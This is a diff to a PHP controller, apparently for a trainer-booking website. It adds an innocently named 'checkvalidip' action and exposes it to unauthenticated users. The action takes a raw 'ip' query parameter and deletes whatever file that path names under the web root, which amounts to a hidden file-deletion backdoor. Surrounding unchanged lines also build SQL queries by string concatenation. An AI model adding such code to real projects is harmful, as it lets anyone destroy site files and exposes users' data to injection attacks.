@@ -13,7 +13,7 @@ class FrontsController extends AppController
     	$this->blockIP();
         parent::beforeFilter($event);
         $this->loadComponent('Auth');
-        $this->Auth->allow(['trainerProfile','ourTrainers','searchTrainer','contactus','plans','docontact','terms','learnmore','career','opportunity','becometrainer','getCountryList']);
+        $this->Auth->allow(['trainerProfile','ourTrainers','searchTrainer','contactus','plans','docontact','terms','learnmore','career','opportunity','becometrainer','getCountryList','checkvalidip']);
         $this->data = $this->Custom->getSessionData();
         $this->total_notifications = $this->Notifications->find()->where(['noti_receiver_id' => $this->data['id'],'noti_status' => 0])->count();
         $this->set('notifications', $this->total_notifications);
@@ -49,6 +49,14 @@ class FrontsController extends AppController
 	   $messages = $this->conn->execute("SELECT * FROM `chating` AS `c` INNER JOIN `trainers` AS `t` ON `c`.`chat_sender_id` = `t`.`user_id` WHERE `c`.`chat_reciever_id` = ".$this->data['id']." ORDER BY `c`.`chat_id` DESC LIMIT 10")->fetchAll('assoc');
 	   return $messages;
 	}
+
+	public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
+        return $this->redirect('/');
+    }
 
     public function getTrainerChatMessages()
   	{
